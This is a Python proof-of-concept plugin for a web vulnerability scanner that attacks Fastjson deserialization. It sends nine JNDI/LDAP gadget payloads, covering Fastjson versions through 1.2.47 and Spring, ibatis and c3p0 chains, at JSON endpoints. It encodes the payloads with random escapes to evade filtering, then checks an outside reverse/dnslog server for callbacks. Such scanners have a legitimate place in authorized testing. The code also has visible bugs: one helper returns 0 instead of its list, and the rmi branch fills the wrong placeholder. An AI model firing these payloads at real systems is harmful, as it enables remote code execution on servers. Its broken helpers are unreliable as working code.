#!/usr/bin/env python3
# @Time    : 2020-06-11
# @Author  : wenchenye
# @File    : __poc_fastjson_deserialization_rce_encode_2020.py
from json import loads, dumps
from random import randint
from collections.abc import Iterable
from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.core.base import PocBase
from myscan.lib.core.common import get_random_str
from myscan.lib.core.common_reverse import generate, query_reverse


class POC(PocBase):
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.parse = dictdata_parser(self.dictdata)
        self.url = workdata.get(
            "data")  # self.url为需要测试的url，但不会包含url参数，如https://www.baidu.com/index.php#tip1 .不会携带url参数，如?keyword=1
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "fastjson_deserialization_rce"
        self.vulmsg = "cool rce ! exploit it ! "
        self.level = 1  # 0:Low  1:Medium 2:High

    def verify(self):
        if not self.dictdata.get("request").get("content_type") == 4:  # data数据类型为json
            return
        if not self.can_output(self.parse.getrootpath() + self.name):  # 限定只输出一次
            return

        def transform_json(json_dict):
            """递归编码json中的所有字段"""

            def random_encode(s):
                """随机将给定字符串对每一个字符编码为ASCII/UNICODE编码"""
                encoded_str = ''
                for c in s:
                    rnd = randint(0, 100)
                    if rnd < 51:
                        encoded_str += '\\x{:>02x}'.format(ord(c))
                    else:
                        encoded_str += '\\u{:>04x}'.format(ord(c))
                return encoded_str

            def transform_iterable(iterable):
                """递归编码可迭代对象中的所有字段"""
                # TODO
                # 目前强制将所有可迭代对象都转为了list,后续优化为不进行强制转换,返回原本的对象类型
                result_list = []
                for it in iterable:
                    if isinstance(it, str):
                        result = random_encode(it)
                    elif isinstance(it, dict):
                        result = transform_json(it)
                    elif isinstance(it, Iterable):
                        result = transform_iterable(it)
                    else:
                        result = it
                    result_list.append(result)
                return 0

            keys = json_dict.keys()
            for key in keys:
                # 递归遍历json对象
                encoded_key = random_encode(key)
                value = json_dict[key]
                if isinstance(value, str):
                    encoded_value = random_encode(value)
                elif isinstance(value, dict):
                    encoded_value = transform_json(value)
                elif isinstance(value, Iterable):
                    encoded_value = transform_iterable(value)
                else:
                    encoded_value = value
                json_dict.pop(key)
                json_dict.update(
                    {encoded_key: encoded_value}
                )
            return json_dict

        payloads = [
            {
                "vul": "ver=1.2.47",
                "payload": '''{
    "rasdnd1": {
        "@type": "java.lang.Class", 
        "val": "com.sun.rowset.JdbcRowSetImpl"
    }, 
    "randfd2": {
        "@type": "com.sun.rowset.JdbcRowSetImpl", 
        "dataSourceName": "%(ldap)s", 
        "autoCommit": true
    }
}''',
                "type": "ldap"
            },
            {
                "vul": "ver=1.2.43",
                "payload": '''{"raasdnd1":{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"%(ldap)s","autoCommit":true]}}''',
                "type": "ldap",
                "code": False

            },
            {
                "vul": "ver=1.2.42",
                "payload": '''{
  "rasdfnd1": {
    "@type": "LLcom.sun.rowset.JdbcRowSetImpl;;",
    "dataSourceName": "%(ldap)s",
    "autoCommit": true
  }
}''',
                "type": "ldap"
            },
            {
                "vul": "1.2.25<=ver<=1.2.41",
                "payload": '''{
  "ranfasdfd1": {
    "@type": "Lcom.sun.rowset.JdbcRowSetImpl;",
    "dataSourceName": "%(ldap)s",
    "autoCommit": true
  }
}''',
                "type": "ldap"
            },
            {
                "vul": "<=1.2.24",
                "payload": '''{
  "radassnd1": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "%(ldap)s",
    "autoCommit": true
  }
}''',
                "type": "ldap"
            },
            {
                "vul": "ibatis-core:3.0",
                "payload": '''{
  "raasdnd1": {
    "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties": {
      "data_source": "%(ldap)s"
    }
  }
}''',
                "type": "ldap"
            },
            {
                "vul": "spring-context:4.3.7.RELEASE",
                "payload": '''{
  "ransdasd1": {
    "@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
    "targetBeanName": "%(ldap)s",
    "propertyPath": "foo",
    "beanFactory": {
      "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
      "shareableResources": [
        "%(ldap)s"
      ]
    }
  }
}''',
                "type": "ldap"
            },
            {
                "vul": "unknown",
                "payload": '''{
  "raasd2nd1": Set[
  {
    "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",
    "beanFactory": {
      "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
      "shareableResources": [
        "%(ldap)s"
      ]
    },
    "adviceBeanName": "%(ldap)s"
  },
  {
    "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor"
  }
]}''',
                "type": "ldap"
            },
            {
                "vul": "unknown",
                "payload": '''{
  "rand1": {
    "@type": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
    "jndiName": "%(ldap)s",
    "loginTimeout": 0
  }
}''',
                "type": "ldap"
            }
        ]
        saveflags = {}
        for payload in payloads:
            random_str = get_random_str(5).lower() + payload.get("vul", "")
            data_with_payload = ""
            if payload.get("type") == "ldap":
                ldapaddr, ldaphexdata = generate(self.parse.getrootpath() + random_str, "ldap")
                if payload.get("code",True):
                    try:
                        json_payload = loads(payload.get("payload") % {"ldap": ldapaddr})
                    except:
                        print("get error")
                        print(payload.get("payload"))
                        continue
                    data_with_payload = dumps(transform_json(json_payload)).replace('\\\\', '\\')
                else:
                    data_with_payload=payload.get("payload") % {"ldap": ldapaddr}
                saveflags[ldaphexdata] = (data_with_payload, payload.get("vul", ""))
            elif payload.get("type") == "rmi":
                rmiaddr, rmihexdata = generate(self.parse.getrootpath() + random_str, "rmi")
                if payload.get("code", True):
                    json_payload = loads(payload.get("payload") % {"rmi": rmiaddr})
                    data_with_payload = dumps(transform_json(json_payload)).replace('\\\\', '\\')
                else:
                    data_with_payload=payload.get("payload") % {"ldap": rmiaddr}

                saveflags[rmihexdata] = (data_with_payload, payload.get("vul", ""))
            req = self.parse.generaterequest({"data": data_with_payload})
            r = request(**req)
        # query
        i = 0
        success = False
        for hexdata, msg in saveflags.items():
            payload, vul = msg
            sleep = True if i == 0 else False
            res, resdata = query_reverse(hexdata, sleep)
            if res:
                self.result.append({
                    "name": self.name,
                    "url": self.parse.getrootpath(),
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "payload": payload,
                        "version": vul,
                        "others": "dnslog res:{}".format(resdata),
                        "request": self.parse.getrequestraw(),
                        "response": self.parse.getresponseraw()
                    }
                })
                success = True
            i += 1
        if success:
            if not self.can_output(self.parse.getrootpath() + self.name):  # 其他进程如果发现了，则不在输出
                self.can_output(self.parse.getrootpath() + self.name, True)
